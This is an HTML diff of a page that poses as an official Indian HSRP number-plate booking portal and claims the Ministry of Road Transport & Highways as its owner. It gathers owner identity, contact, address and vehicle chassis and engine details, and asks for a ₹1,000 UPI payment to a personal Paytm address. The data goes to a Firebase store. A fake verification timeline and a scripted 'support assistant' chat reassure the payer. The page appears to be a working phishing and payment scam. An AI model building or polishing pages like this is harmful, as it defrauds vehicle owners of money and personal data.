@@ -2,243 +2,354 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HSRP Official Booking Portal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>HSRP Official Booking | India</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Firebase SDKs -->
-    <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-auth-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore-compat.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
-        body { font-family: 'Inter', sans-serif; background-color: #f3f4f6; }
-        .glass-morphism {
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
+        body { font-family: 'Inter', sans-serif; background-color: #f8fafc; }
+        .glass-card { background: white; border-radius: 32px; box-shadow: 0 20px 50px -12px rgba(0, 0, 0, 0.08); border: 1px solid rgba(226, 232, 240, 0.8); }
+        .input-field { 
+            width: 100%; padding: 14px 18px; border: 1.5px solid #e2e8f0; border-radius: 16px; 
+            outline: none; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); font-weight: 500;
         }
-        .chat-container { height: 400px; overflow-y: auto; scrollbar-width: thin; }
-        .step-active { background-color: #2563eb; color: white; }
-        .step-inactive { background-color: #d1d5db; color: #4b5563; }
+        .input-field:focus { border-color: #2563eb; box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1); }
+        .label-text { font-size: 12px; font-weight: 600; color: #475569; margin-bottom: 8px; display: block; margin-left: 4px; }
+        .hidden { display: none; }
+        .step-indicator { height: 4px; border-radius: 2px; background: #e2e8f0; flex: 1; transition: all 0.5s; }
+        .step-indicator.active { background: #2563eb; box-shadow: 0 0 10px rgba(37, 99, 235, 0.3); }
+        
+        /* Chat UI */
+        .chat-container { height: 350px; scroll-behavior: smooth; }
+        .msg { max-width: 85%; padding: 12px 16px; border-radius: 20px; font-size: 14px; margin-bottom: 12px; line-height: 1.5; }
+        .msg-ai { background: #f1f5f9; color: #1e293b; border-bottom-left-radius: 4px; }
+        .msg-user { background: #2563eb; color: white; border-bottom-right-radius: 4px; margin-left: auto; }
+        
+        /* Success Timeline */
+        .timeline-item { position: relative; padding-left: 30px; padding-bottom: 25px; }
+        .timeline-item::before { content: ''; position: absolute; left: 10px; top: 0; bottom: 0; width: 2px; background: #e2e8f0; }
+        .timeline-item:last-child::before { display: none; }
+        .timeline-dot { position: absolute; left: 0; top: 0; width: 22px; height: 22px; border-radius: 50%; background: #e2e8f0; border: 4px solid white; box-shadow: 0 0 0 1px #e2e8f0; }
+        .dot-active { background: #2563eb; box-shadow: 0 0 0 1px #2563eb; }
+        .dot-done { background: #22c55e; box-shadow: 0 0 0 1px #22c55e; }
     </style>
 </head>
-<body class="min-h-screen flex flex-col items-center p-4">
+<body class="min-h-screen">
 
-    <!-- Header Steps -->
-    <div class="w-full max-w-2xl flex justify-between items-center mb-8 px-4">
-        <div class="flex flex-col items-center gap-1">
-            <div class="w-8 h-8 rounded-full flex items-center justify-center step-active font-bold">1</div>
-            <span class="text-[10px] font-bold text-blue-600">VEHICLE</span>
-        </div>
-        <div class="h-[2px] flex-1 bg-blue-600 mx-2"></div>
-        <div class="flex flex-col items-center gap-1">
-            <div class="w-8 h-8 rounded-full flex items-center justify-center step-active font-bold">2</div>
-            <span class="text-[10px] font-bold text-blue-600">PERSONAL</span>
-        </div>
-        <div class="h-[2px] flex-1 bg-blue-600 mx-2"></div>
-        <div class="flex flex-col items-center gap-1">
-            <div class="w-8 h-8 rounded-full flex items-center justify-center step-active font-bold">3</div>
-            <span class="text-[10px] font-bold text-blue-600">PAYMENT</span>
-        </div>
-        <div class="h-[2px] flex-1 bg-gray-300 mx-2"></div>
-        <div class="flex flex-col items-center gap-1">
-            <div class="w-8 h-8 rounded-full flex items-center justify-center step-active font-bold border-2 border-blue-600">4</div>
-            <span class="text-[10px] font-bold text-blue-600">SUCCESS</span>
-        </div>
-    </div>
-
-    <!-- Main Booking Card -->
-    <div class="w-full max-w-lg glass-morphism rounded-[40px] shadow-2xl p-8 text-center relative mb-10">
-        <div class="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg shadow-green-200">
-            <svg class="w-12 h-12 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
-        </div>
+    <div class="max-w-xl mx-auto px-4 py-8">
         
-        <h1 class="text-3xl font-extrabold text-gray-900 mb-2">Booking Received!</h1>
-        <p class="text-gray-500 mb-8">Verification process has started.</p>
-
-        <!-- Digital Receipt Box -->
-        <div class="bg-gray-50 rounded-3xl p-6 text-left mb-8 border border-gray-100">
-            <div class="flex justify-between items-center mb-4">
-                <span class="text-[10px] font-bold text-gray-400 tracking-widest">DIGITAL RECEIPT</span>
-                <span class="bg-blue-100 text-blue-600 text-[10px] font-bold px-3 py-1 rounded-full uppercase">Processing</span>
+        <!-- Navbar -->
+        <div class="flex justify-between items-center mb-10 px-2">
+            <div>
+                <h1 class="text-2xl font-black text-blue-600 tracking-tight italic">HSRP Portal</h1>
+                <p class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Official Registration</p>
             </div>
+            <div class="bg-green-50 text-green-600 text-[10px] font-bold px-3 py-1.5 rounded-full border border-green-100 uppercase">Secure 256-bit</div>
+        </div>
+
+        <!-- Step Bars -->
+        <div class="flex gap-2 mb-10" id="step-bars">
+            <div class="step-indicator active"></div>
+            <div class="step-indicator"></div>
+            <div class="step-indicator"></div>
+        </div>
+
+        <div class="glass-card p-8">
             
-            <div class="space-y-3">
-                <div class="flex justify-between items-center">
-                    <span class="text-gray-400 text-sm">Vehicle No.</span>
-                    <span class="font-bold text-gray-800">65435YY56</span>
-                </div>
-                <div class="flex justify-between items-center border-t border-gray-200 pt-3">
-                    <span class="text-gray-400 text-sm">Reference ID</span>
-                    <span class="font-bold text-gray-800">HSR-866976</span>
-                </div>
-                <div class="flex justify-between items-center border-t border-gray-200 pt-3">
-                    <span class="text-gray-400 text-sm">Transaction ID</span>
-                    <span class="font-mono text-xs font-bold text-gray-800 break-all ml-4">hasjdgvhjsdfgbdfg</span>
-                </div>
-            </div>
-        </div>
-
-        <!-- Buttons -->
-        <div class="space-y-4">
-            <button onclick="toggleChat()" class="w-full bg-blue-50 border-2 border-blue-100 text-blue-600 font-bold py-4 rounded-2xl flex items-center justify-center gap-3 hover:bg-blue-100 transition-all">
-                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
-                Need Help? Talk to AI
-            </button>
-            <button class="w-full bg-gray-900 text-white font-bold py-4 rounded-2xl hover:bg-black transition-all">
-                Go Back Home
-            </button>
-        </div>
-    </div>
-
-    <!-- AI Chat Modal -->
-    <div id="chatModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
-        <div class="w-full max-w-md bg-white rounded-[32px] overflow-hidden shadow-2xl flex flex-col">
-            <!-- Chat Header -->
-            <div class="bg-blue-600 p-6 flex justify-between items-center text-white">
-                <div class="flex items-center gap-3">
-                    <div class="w-10 h-10 bg-white/20 rounded-xl flex items-center justify-center">
-                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
+            <!-- STEP 1: VEHICLE DETAILS -->
+            <div id="step-1">
+                <h2 class="text-xl font-bold text-slate-800 mb-6">Vehicle Details</h2>
+                <div class="space-y-6">
+                    <div>
+                        <label class="label-text">Select State/UT</label>
+                        <select id="state" class="input-field">
+                            <option value="">Select State</option>
+                            <option>Delhi</option><option>Uttar Pradesh</option><option>Haryana</option><option>Maharashtra</option><option>Rajasthan</option><option>Punjab</option><option>Bihar</option><option>Gujarat</option><option>Karnataka</option><option>Madhya Pradesh</option><option>Tamil Nadu</option><option>West Bengal</option><option>Andhra Pradesh</option><option>Assam</option><option>Chhattisgarh</option><option>Goa</option><option>Himachal Pradesh</option><option>Jharkhand</option><option>Kerala</option><option>Odisha</option><option>Telangana</option><option>Uttarakhand</option><option>Other UT</option>
+                        </select>
                     </div>
                     <div>
-                        <h3 class="font-bold">Support Assistant</h3>
-                        <div class="flex items-center gap-1">
-                            <span class="w-2 h-2 bg-green-400 rounded-full"></span>
-                            <span class="text-[10px] opacity-80 uppercase tracking-widest font-bold">Live Help</span>
+                        <label class="label-text">Registration Number</label>
+                        <input type="text" id="regNo" placeholder="DL 01 AB 1234" class="input-field uppercase">
+                    </div>
+                    <div class="grid grid-cols-2 gap-4">
+                        <div>
+                            <label class="label-text">Chassis (Last 5)</label>
+                            <input type="text" id="chassis" maxlength="5" placeholder="12345" class="input-field uppercase">
+                        </div>
+                        <div>
+                            <label class="label-text">Engine (Last 5)</label>
+                            <input type="text" id="engine" maxlength="5" placeholder="12345" class="input-field uppercase">
+                        </div>
+                    </div>
+                    <div class="grid grid-cols-2 gap-4">
+                        <div>
+                            <label class="label-text">Vehicle Category</label>
+                            <select id="vType" class="input-field">
+                                <option value="2W">Two Wheeler</option>
+                                <option value="4W">Four Wheeler</option>
+                                <option value="Commercial">Commercial</option>
+                            </select>
+                        </div>
+                        <div>
+                            <label class="label-text">Fuel Type</label>
+                            <select id="fuel" class="input-field">
+                                <option>Petrol</option><option>Diesel</option><option>CNG</option><option>EV</option>
+                            </select>
                         </div>
                     </div>
                 </div>
-                <button onclick="toggleChat()" class="hover:bg-white/10 p-2 rounded-full transition-colors">
-                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+                <button onclick="nextStep(2)" class="w-full bg-blue-600 text-white font-bold py-5 rounded-2xl mt-10 hover:bg-blue-700 shadow-xl shadow-blue-100 transition-all">Continue Booking</button>
+            </div>
+
+            <!-- STEP 2: OWNER INFO -->
+            <div id="step-2" class="hidden">
+                <h2 class="text-xl font-bold text-slate-800 mb-6">Owner Information</h2>
+                <div class="space-y-6">
+                    <div>
+                        <label class="label-text">Owner Full Name</label>
+                        <input type="text" id="ownerName" placeholder="Enter name as per RC" class="input-field">
+                    </div>
+                    <div class="grid grid-cols-2 gap-4">
+                        <div>
+                            <label class="label-text">Mobile Number</label>
+                            <input type="tel" id="mobile" maxlength="10" placeholder="9876543210" class="input-field">
+                        </div>
+                        <div>
+                            <label class="label-text">Email Address</label>
+                            <input type="email" id="email" placeholder="example@gmail.com" class="input-field">
+                        </div>
+                    </div>
+                    <div>
+                        <label class="label-text">Shipping Address</label>
+                        <textarea id="address" placeholder="Full Address with Pincode" class="input-field h-24"></textarea>
+                    </div>
+                </div>
+                <div class="flex gap-4 mt-10">
+                    <button onclick="nextStep(1)" class="flex-1 font-bold text-slate-500 py-4">Back</button>
+                    <button onclick="nextStep(3)" class="flex-[2] bg-blue-600 text-white font-bold py-5 rounded-2xl shadow-xl shadow-blue-100">Pay Now</button>
+                </div>
+            </div>
+
+            <!-- STEP 3: PAYMENT -->
+            <div id="step-3" class="hidden text-center">
+                <div class="mb-6">
+                    <h2 class="text-xl font-bold text-slate-800">Secure Checkout</h2>
+                    <p class="text-slate-400 text-xs">Scan & Pay to Confirm Booking</p>
+                </div>
+
+                <div class="bg-slate-50 p-6 rounded-3xl mb-6 inline-block border-2 border-dashed border-slate-200">
+                    <img id="upi-qr" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=paytmqr28100505010115l9w676s3u7@paytm&am=1000&cu=INR" class="w-44 h-44 rounded-xl">
+                </div>
+
+                <div class="bg-blue-600 text-white p-4 rounded-2xl font-bold text-lg mb-8">
+                    Total Payable: ₹1,000.00
+                </div>
+
+                <div class="text-left mb-6">
+                    <label class="label-text">Enter 12-Digit Transaction/UTR ID</label>
+                    <input type="text" id="utr" maxlength="12" placeholder="Ex: 3102..." class="input-field text-center text-xl font-mono tracking-widest">
+                </div>
+
+                <button onclick="submitToFirebase()" id="submitBtn" class="w-full bg-green-600 text-white font-bold py-5 rounded-2xl shadow-xl shadow-green-100 flex items-center justify-center gap-2">
+                    <span id="btnText">Confirm & Submit</span>
                 </button>
             </div>
 
-            <!-- Messages Area -->
-            <div id="messages" class="chat-container p-6 space-y-4 bg-gray-50 flex-1">
-                <div class="flex flex-col items-start">
-                    <div class="bg-blue-600 text-white p-4 rounded-2xl rounded-tl-none max-w-[85%] shadow-sm">
-                        Namaste! I found the booking for 65435YY56. Payment verification is currently in progress (2-4 hours). How can I assist you today?
+            <!-- THANK YOU PAGE (As per screenshot) -->
+            <div id="step-success" class="hidden">
+                <div class="text-center mb-10">
+                    <div class="w-20 h-20 bg-green-500 text-white rounded-full flex items-center justify-center mx-auto mb-6 shadow-2xl shadow-green-200 animate-bounce">
+                        <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
+                    </div>
+                    <h1 class="text-3xl font-black text-slate-900 mb-2">Booking Received!</h1>
+                    <p class="text-slate-500 text-sm">Verification process has started.</p>
+                </div>
+
+                <!-- Digital Receipt -->
+                <div class="bg-slate-50 border border-slate-100 rounded-3xl p-6 mb-8">
+                    <div class="flex justify-between items-center mb-6">
+                        <span class="text-[10px] font-black uppercase text-slate-400 tracking-wider">Digital Receipt</span>
+                        <span class="bg-blue-100 text-blue-700 text-[10px] font-bold px-2 py-0.5 rounded uppercase">Processing</span>
+                    </div>
+                    <div class="space-y-4">
+                        <div class="flex justify-between text-sm">
+                            <span class="text-slate-500 font-medium">Vehicle No.</span>
+                            <span class="font-bold text-slate-900 uppercase" id="res-vno">--</span>
+                        </div>
+                        <div class="flex justify-between text-sm">
+                            <span class="text-slate-500 font-medium">Reference ID</span>
+                            <span class="font-bold text-slate-900" id="res-ref">--</span>
+                        </div>
+                        <div class="flex justify-between text-sm pt-4 border-t border-slate-200">
+                            <span class="text-slate-500 font-medium">Transaction ID</span>
+                            <span class="font-mono text-slate-900 truncate ml-4" id="res-utr">--</span>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Status Timeline -->
+                <div class="mb-10">
+                    <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-6">Status Timeline</h3>
+                    <div class="timeline-item">
+                        <div class="timeline-dot dot-done"></div>
+                        <p class="text-sm font-bold text-slate-900">Payment Verification</p>
+                        <p class="text-[11px] text-slate-500">Completed in 2-4 hours.</p>
+                    </div>
+                    <div class="timeline-item">
+                        <div class="timeline-dot dot-active"></div>
+                        <p class="text-sm font-bold text-slate-900">RTO Data Submission</p>
+                        <p class="text-[11px] text-slate-500">Expected in 4-6 working days.</p>
+                    </div>
+                    <div class="timeline-item">
+                        <div class="timeline-dot"></div>
+                        <p class="text-sm font-bold text-slate-600">Final Home Delivery</p>
+                        <p class="text-[11px] text-blue-600 font-bold uppercase">Estimated: 10-14 Working Days</p>
+                    </div>
+                </div>
+
+                <!-- Chat Support Interface -->
+                <div class="border border-slate-200 rounded-3xl overflow-hidden shadow-sm">
+                    <div class="bg-blue-600 p-4 flex items-center justify-between">
+                        <div class="flex items-center gap-3">
+                            <div class="w-10 h-10 bg-white/20 rounded-xl flex items-center justify-center text-white text-xl">💬</div>
+                            <div>
+                                <p class="text-white font-bold text-sm">Support Assistant</p>
+                                <p class="text-blue-100 text-[10px] flex items-center gap-1"><span class="w-1.5 h-1.5 bg-green-400 rounded-full animate-pulse"></span> LIVE HELP</p>
+                            </div>
+                        </div>
+                        <button onclick="location.reload()" class="text-white/60 hover:text-white"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M6 18L18 6M6 6l12 12"></path></svg></button>
+                    </div>
+                    <div id="chat-box" class="chat-container p-4 bg-white overflow-y-auto">
+                        <div class="msg msg-ai">Namaste! I found the booking for <span class="res-vno-inline font-bold"></span>. Payment verification is currently in progress (2-4 hours). How can I assist you today?</div>
+                    </div>
+                    <div class="p-4 bg-slate-50 border-t flex gap-2">
+                        <input type="text" id="chat-in" placeholder="Type your message..." class="flex-1 bg-white border border-slate-200 rounded-xl px-4 py-2 text-sm outline-none focus:border-blue-600">
+                        <button onclick="sendChat()" class="bg-blue-600 text-white p-2.5 rounded-xl"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"></path></svg></button>
                     </div>
                 </div>
             </div>
 
-            <!-- Input Area -->
-            <div class="p-6 bg-white border-t border-gray-100">
-                <div class="relative flex items-center gap-2">
-                    <input type="text" id="userInput" placeholder="Type your message..." 
-                           class="w-full bg-gray-100 border-none rounded-2xl px-5 py-4 focus:ring-2 focus:ring-blue-600 outline-none transition-all">
-                    
-                    <!-- Hidden File Input for QR/Images -->
-                    <input type="file" id="fileInput" class="hidden" accept="image/*">
-                    <button onclick="document.getElementById('fileInput').click()" class="absolute right-16 text-gray-400 hover:text-blue-600">
-                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
-                    </button>
-
-                    <button onclick="sendMessage()" class="bg-blue-600 text-white p-4 rounded-2xl hover:bg-blue-700 shadow-lg shadow-blue-200 transition-all">
-                        <svg class="w-5 h-5 transform rotate-90" fill="currentColor" viewBox="0 0 20 20"><path d="M10.894 2.553a1 1 0 00-1.788 0l-7 14a1 1 0 001.169 1.409l5-1.429A1 1 0 009 15.571V11a1 1 0 112 0v4.571a1 1 0 00.725.962l5 1.428a1 1 0 001.17-1.408l-7-14z"></path></svg>
-                    </button>
-                </div>
-                <p id="errorMsg" class="text-red-500 text-[10px] mt-2 hidden"></p>
-            </div>
         </div>
+        
+        <p class="text-center text-slate-400 text-[10px] mt-10 font-bold uppercase tracking-widest">© 2026 Ministry of Road Transport & Highways</p>
     </div>
 
-    <script>
-        // --- CONFIGURATION (Bhai, yahan apni details dalo) ---
+    <!-- Firebase SDKs -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+
+        // From your screenshot
         const firebaseConfig = {
-            apiKey: "AiZaSyBfF7PTAidu iPr7mcU_Abhw_58HMy-6VCw", // Space hatana screenshot se dekh kar
+            apiKey: "AIzaSyBfF7PTAiduiPr7mcU_Abhw_58HMy-6VCw",
             authDomain: "hsp-chat-box-api.firebaseapp.com",
             projectId: "hsp-chat-box-api",
             storageBucket: "hsp-chat-box-api.firebasestorage.app",
             messagingSenderId: "573359693574",
-            appId: "1:573359693574:web:7c628a3c1b92d8bc5b0887"
+            appId: "1:573359693574:web:7c628a3c1b92d8bc5b0887",
+            measurementId: "G-GN3NKF9JZX"
         };
-        
-        // Gemini API Key (Aapka API Key yahan paste karein)
-        const GEMINI_API_KEY = ""; 
 
-        // Initialize Firebase
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        const auth = getAuth(app);
+        const appId = "hsp-chat-box-api";
 
-        function toggleChat() {
-            const modal = document.getElementById('chatModal');
-            modal.classList.toggle('hidden');
-        }
+        window.submitToFirebase = async () => {
+            const utr = document.getElementById('utr').value;
+            if(utr.length < 10) {
+                alert("Please enter a valid 12-digit UTR!");
+                return;
+            }
 
-        async function sendMessage() {
-            const input = document.getElementById('userInput');
-            const message = input.value.trim();
-            if (!message) return;
-
-            addMessage(message, 'user');
-            input.value = '';
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            document.getElementById('btnText').textContent = "Verifying Transaction...";
 
             try {
-                // Save to Firestore (Public Collection)
-                await db.collection('artifacts').doc('hsrp-support').collection('public').add({
-                    text: message,
-                    timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-                    sender: 'user'
-                });
+                await signInAnonymously(auth);
+                const bookingRef = "HSR-" + Math.floor(Math.random() * 900000 + 100000);
+                
+                const data = {
+                    state: document.getElementById('state').value,
+                    regNo: document.getElementById('regNo').value.toUpperCase(),
+                    chassis: document.getElementById('chassis').value.toUpperCase(),
+                    engine: document.getElementById('engine').value.toUpperCase(),
+                    vehicleType: document.getElementById('vType').value,
+                    ownerName: document.getElementById('ownerName').value,
+                    mobile: document.getElementById('mobile').value,
+                    email: document.getElementById('email').value,
+                    address: document.getElementById('address').value,
+                    utr: utr,
+                    bookingRef: bookingRef,
+                    createdAt: serverTimestamp()
+                };
 
-                // Get AI Response from Gemini
-                const aiResponse = await getGeminiResponse(message);
-                addMessage(aiResponse, 'ai');
+                // Path as per RULE 1
+                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'bookings'), data);
 
-            } catch (err) {
-                console.error(err);
-                addMessage("I'm having a slight connection issue. Please check your Firebase rules or Internet.", 'ai');
-            }
-        }
+                // UI Transition
+                document.getElementById('step-3').classList.add('hidden');
+                document.getElementById('step-success').classList.remove('hidden');
+                document.getElementById('step-bars').classList.add('hidden');
+                
+                // Set data on success page
+                document.getElementById('res-vno').textContent = data.regNo;
+                document.getElementById('res-ref').textContent = data.bookingRef;
+                document.getElementById('res-utr').textContent = data.utr;
+                document.querySelectorAll('.res-vno-inline').forEach(el => el.textContent = data.regNo);
 
-        async function getGeminiResponse(userPrompt) {
-            if(!GEMINI_API_KEY) return "Bhai, pehle Gemini API Key code mein daalo tabhi main reply kar paunga.";
-
-            const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_API_KEY}`;
-            
-            const payload = {
-                contents: [{
-                    parts: [{ text: `You are a helpful HSRP (High Security Registration Plate) Support Assistant. Help the user with their booking 65435YY56. User said: ${userPrompt}` }]
-                }]
-            };
-
-            const response = await fetch(url, {
-                method: 'POST',
-                body: JSON.stringify(payload)
-            });
-            const data = await response.json();
-            return data.candidates[0].content.parts[0].text;
-        }
-
-        function addMessage(text, sender) {
-            const container = document.getElementById('messages');
-            const div = document.createElement('div');
-            div.className = `flex flex-col ${sender === 'user' ? 'items-end' : 'items-start'}`;
-            
-            const innerDiv = document.createElement('div');
-            innerDiv.className = sender === 'user' 
-                ? 'bg-white border border-gray-200 text-gray-800 p-4 rounded-2xl rounded-tr-none max-w-[85%] shadow-sm'
-                : 'bg-blue-600 text-white p-4 rounded-2xl rounded-tl-none max-w-[85%] shadow-sm';
-            
-            innerDiv.innerText = text;
-            div.appendChild(innerDiv);
-            container.appendChild(div);
-            container.scrollTop = container.scrollHeight;
-        }
-
-        // Image Selection Handler
-        document.getElementById('fileInput').onchange = function(e) {
-            const file = e.target.files[0];
-            if(file) {
-                addMessage(`Uploading ${file.name}...`, 'user');
-                // Note: Real file upload needs Firebase Storage. 
-                // For now, we simulate success.
-                setTimeout(() => {
-                    addMessage("QR received and verified. Please proceed with payment.", 'ai');
-                }, 1500);
+            } catch (error) {
+                console.error(error);
+                alert("Submission error. Check your internet.");
+                btn.disabled = false;
+                document.getElementById('btnText').textContent = "Confirm & Submit";
             }
         };
+    </script>
+
+    <script>
+        function nextStep(step) {
+            const bars = document.querySelectorAll('.step-indicator');
+            bars.forEach((bar, i) => {
+                if (i < step) bar.classList.add('active');
+                else bar.classList.remove('active');
+            });
+
+            document.getElementById('step-1').classList.add('hidden');
+            document.getElementById('step-2').classList.add('hidden');
+            document.getElementById('step-3').classList.add('hidden');
+            document.getElementById(`step-${step}`).classList.remove('hidden');
+            window.scrollTo(0, 0);
+        }
+
+        function sendChat() {
+            const inp = document.getElementById('chat-in');
+            const box = document.getElementById('chat-box');
+            if(!inp.value.trim()) return;
+
+            const uMsg = document.createElement('div');
+            uMsg.className = "msg msg-user";
+            uMsg.textContent = inp.value;
+            box.appendChild(uMsg);
+
+            const val = inp.value.toLowerCase();
+            inp.value = '';
+
+            setTimeout(() => {
+                const aiMsg = document.createElement('div');
+                aiMsg.className = "msg msg-ai";
+                
+                if(val.includes('kya hal')) aiMsg.textContent = "Sab badhiya hai bhai! Aapki booking status check ho rahi hai. Verification 2-4 ghante mein ho jayegi.";
+                else if(val.includes('delay') || val.includes('time')) aiMsg.textContent = "Standard time 10-14 days hai delivery ke liye. Don't worry, aapko SMS notification milta rahega.";
+                else if(val.includes('status')) aiMsg.textContent = "Aapka status 'Payment Verification' stage par hai. Agla step RTO approval hoga.";
+                else aiMsg.textContent = "Bhai, main samajh gaya. Verification ke baad hi process start hoga. Stay tuned!";
+
+                box.appendChild(aiMsg);
+                box.scrollTop = box.scrollHeight;
+            }, 700);
+        }
     </script>
 </body>
 </html>
